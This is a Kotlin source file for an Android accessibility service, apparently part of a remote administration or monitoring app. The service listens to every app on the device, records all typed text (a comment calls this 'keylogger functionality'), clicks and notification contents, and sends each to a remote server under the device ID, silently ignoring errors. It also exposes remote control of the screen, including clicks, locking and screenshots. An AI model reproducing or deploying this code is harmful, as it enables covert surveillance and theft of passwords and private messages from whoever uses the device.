package com.abuzahra.manager.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Accessibility Service for Abu-Zahra Admin
 * Provides screen reading, text input monitoring, and automated UI interactions
 */
class MyAccessibilityService : AccessibilityService() {

    companion object {
        private var instance: MyAccessibilityService? = null

        fun getInstance(): MyAccessibilityService? = instance

        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "${context.packageName}/${MyAccessibilityService::class.java.canonicalName}"
            return enabledServices.contains(serviceName) || enabledServices.contains(context.packageName)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        // Configure the service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
            packageNames = null // Listen to all packages
        }
        serviceInfo = info

        // Notify server that accessibility is enabled
        CoroutineScope(Dispatchers.IO).launch {
            try {
                ApiClient.sendEvent(
                    DeviceUtils.getDeviceId(this@MyAccessibilityService),
                    "accessibility_enabled",
                    mapOf("status" to "connected")
                )
            } catch (_: Exception) {}
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // Process accessibility events
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Text input monitoring
                val text = event.text?.toString() ?: ""
                val packageName = event.packageName?.toString() ?: ""

                // Log text changes for keylogger functionality
                if (text.isNotEmpty()) {
                    logKeyEvent(packageName, text)
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Button/View click monitoring
                val viewText = event.text?.toString() ?: ""
                val packageName = event.packageName?.toString() ?: ""
                logClickEvent(packageName, viewText)
            }

            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                // Notification monitoring
                val notificationText = event.text?.toString() ?: ""
                val packageName = event.packageName?.toString() ?: ""
                logNotification(packageName, notificationText)
            }
        }
    }

    override fun onInterrupt() {
        // Handle service interruption
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    private fun logKeyEvent(packageName: String, text: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                ApiClient.sendEvent(
                    DeviceUtils.getDeviceId(this@MyAccessibilityService),
                    "key_event",
                    mapOf("package" to packageName, "text" to text)
                )
            } catch (_: Exception) {}
        }
    }

    private fun logClickEvent(packageName: String, viewText: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                ApiClient.sendEvent(
                    DeviceUtils.getDeviceId(this@MyAccessibilityService),
                    "click_event",
                    mapOf("package" to packageName, "view" to viewText)
                )
            } catch (_: Exception) {}
        }
    }

    private fun logNotification(packageName: String, text: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                ApiClient.sendEvent(
                    DeviceUtils.getDeviceId(this@MyAccessibilityService),
                    "notification_event",
                    mapOf("package" to packageName, "text" to text)
                )
            } catch (_: Exception) {}
        }
    }

    /**
     * Perform click on node by text
     */
    fun clickOnText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            // Try parent if node is not clickable
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
                parent = parent.parent
            }
        }
        return false
    }

    /**
     * Perform click on node by view ID
     */
    fun clickOnViewId(viewId: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        for (node in nodes) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }
        return false
    }

    /**
     * Perform global action (back, home, recents, etc.)
     */
    fun performGlobalAction(action: Int): Boolean {
        return performGlobalAction(action)
    }

    /**
     * Go back
     */
    fun goBack(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_BACK)
    }

    /**
     * Go home
     */
    fun goHome(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_HOME)
    }

    /**
     * Open recents
     */
    fun openRecents(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_RECENTS)
    }

    /**
     * Open notifications panel
     */
    fun openNotifications(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
    }

    /**
     * Open quick settings
     */
    fun openQuickSettings(): Boolean {
        return performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
    }

    /**
     * Lock screen (Android 9+)
     */
    fun lockScreen(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
        } else {
            false
        }
    }

    /**
     * Take screenshot (Android 9+)
     */
    fun takeScreenshot(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
        } else {
            false
        }
    }
}
